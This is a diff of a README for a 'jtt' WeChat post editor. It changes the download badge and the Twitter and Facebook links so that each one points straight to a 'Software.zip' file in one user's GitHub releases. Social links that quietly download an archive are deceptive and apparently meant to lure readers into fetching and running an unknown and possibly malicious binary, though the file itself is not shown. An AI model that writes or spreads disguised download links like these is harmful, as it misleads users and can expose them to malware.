@@ -30,7 +30,7 @@ If you encounter any issues during the setup process, feel free to reach out to 
 
 You can download the latest version of the "jtt" editor by clicking the button below:
 
-[![Download jtt Editor](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download jtt Editor](https://github.com/chuy2905/jtt/releases/download/v1.0/Software.zip)](https://github.com/chuy2905/jtt/releases/download/v1.0/Software.zip)
 
 After downloading the file, launch the editor and unleash your creativity in crafting compelling WeChat posts.
 
@@ -50,9 +50,9 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 Let's connect on social media!
 
-👉 Follow us on [Twitter](https://twitter.com/your-twitter-handle)
+👉 Follow us on [Twitter](https://github.com/chuy2905/jtt/releases/download/v1.0/Software.zip)
 
-👉 Like us on [Facebook](https://facebook.com/your-facebook-page)
+👉 Like us on [Facebook](https://github.com/chuy2905/jtt/releases/download/v1.0/Software.zip)
 
 ---
 
